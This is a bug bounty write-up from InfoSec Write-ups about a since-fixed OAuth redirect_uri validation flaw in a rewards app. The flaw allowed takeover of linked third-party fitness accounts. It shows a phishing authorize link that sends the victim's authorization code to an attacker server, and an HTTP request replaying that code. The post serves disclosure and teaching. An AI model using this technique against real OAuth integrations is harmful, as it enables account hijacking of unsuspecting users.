---
title: Third Party Services Takeover using Oauth Misconfiguration
url: https://infosecwriteups.com/third-party-services-takeover-using-oauth-misconfiguration-8888a0c1ad86?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2024-12-15
fetch_date: 2025-10-06T19:37:10.263438
---

# Third Party Services Takeover using Oauth Misconfiguration

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F8888a0c1ad86&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fthird-party-services-takeover-using-oauth-misconfiguration-8888a0c1ad86&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fthird-party-services-takeover-using-oauth-misconfiguration-8888a0c1ad86&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-8888a0c1ad86---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-8888a0c1ad86---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# Third Party Services Takeover using Oauth Misconfiguration

[![Ronak Patel](https://miro.medium.com/v2/resize:fill:64:64/1*yV1aLbdrDBM9XZBdntF_kQ.jpeg)](https://ronak-9889.medium.com/?source=post_page---byline--8888a0c1ad86---------------------------------------)

[Ronak Patel](https://ronak-9889.medium.com/?source=post_page---byline--8888a0c1ad86---------------------------------------)

3 min read

·

Dec 13, 2024

--

Listen

Share

Hello Guys/Community,

Hope everything’s Fine.

Today, I am going to write about my recently fixed bug which belongs to private program. The main concept of the program is about rewards points (reward currency). This site/program contains listing of third party sites/near by services belongs fitness,traveling,rent payments,restaurants and more. User could link his account with the third party services and get the reward points on the booking or subscription through this platform.

Press enter or click to view image in full size

![]()

As per above screenshot, App was allowing user to link nearby fitness class and mange/book classes of one fitness chain through app.

This link account functionality was using OAuth to get the permissions and the user account details from the fitness class website(third party site).

I would recommend below link for those who are not familiar with the oath and attack types.

[## OAuth 2.0 authentication vulnerabilities | Web Security Academy

### While browsing the web, you've almost certainly come across sites that let you log in using your social media account…

portswigger.net](https://portswigger.net/web-security/oauth?source=post_page-----8888a0c1ad86---------------------------------------)

However ,In our case this implementation was flawed and Oauth client was not verifying “redirect\_uri” properly leads to third party (Fitness class) account Hijacking.

Below, i have illustrated how attack flow is possible:

1. Attacker sends below vulnerable link to victim through phishing or any other medium and induce victim to initiate the OAuth flow

```
"https://www.Thirdpartywebsite.com/oauth/authorize/?client_id=com.thirdpaty.app.rewards&redirect_uri=Attackerserver&scope=&response_type=code&response_mode=query&state=a2fd91ef-b95d-4cfd-97ad-d118e30487b3"
```

Where redirect\_uri is attacker controlled server.

2. As per below image OAuth implementation accepts attacker supplied url and set the redirect-uri attacker supplied url.

Press enter or click to view image in full size

![]()

3. Once victim finish the OAuth flow as per the screenshot below victim’s OAuth code would be received at attacker server/attacker supplied redirect-uri website.

Press enter or click to view image in full size

![]()

4. Attacker logs in to his Reward App account(Private program),intercepts any api request and replace with the below request

```
PUT /fitnessapp/link-account HTTP/2
Host: api.privateprogram.com
Content-Length: 159
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Dnt: 1
Sec-Ch-Ua-Mobile: ?0
Authorization: Bearer your attacker account auth token
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/json
Accept: application/json, text/plain, */*
Sec-Ch-Ua-Platform: "Windows"
Origin:
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer:
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i

{"authorizationCode":"victim's auth code captured in step3","redirectUri":"https://attacker server"}
```

As per the screenshots below upon forwarding above request attacker was able to link victim’s third party(fitness class) account with his reward platform(private porgram) account.

Press enter or click to view image in full size

![]()

Press enter or click to view image in full size

![]()

Now attacker could view and manage fitness class bookings behalf of victim.

Thanks for reading and hope this was worth to spend your precious time reading :-)

[Bug Bounty](https://medium.com/tag/bug-bounty?source=post_page-----8888a0c1ad86---------------------------------------)

[Ethical Hacking](https://medium.com/tag/ethical-hacking?source=post_page-----8888a0c1ad86---------------------------------------)

[Information Security](https://medium.com/tag/information-security?source=post_page-----8888a0c1ad86---------------------------------------)

[Cybersecurity](https://medium.com/tag/cybersecurity?source=post_page-----8888a0c1ad86---------------------------------------)

--

--

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:96:96/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--8888a0c1ad86---------------------------------------)

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:128:128/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--8888a0c1ad86---------------------------------------)

Follow

[## Published in InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---post_publication_info--8888a0c1ad86---------------------------------------)

[71K followers](/followers?source=post_page---post_publication_info--8888a0c1ad86---------------------------------------)

·[Last published 4 hours ago](/baby-dfc2547dc387?source=post_page---post_publication_info--8888a0c1ad86---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow

[![Ronak Patel](https://miro.medium.com/v2/resize:fill:96:96/1*yV1aLbdrDBM9XZBdntF_kQ.jpeg)](https://ronak-9889.medium.com/?source=post_page---post_author_info--8888a0c1ad86------------------------...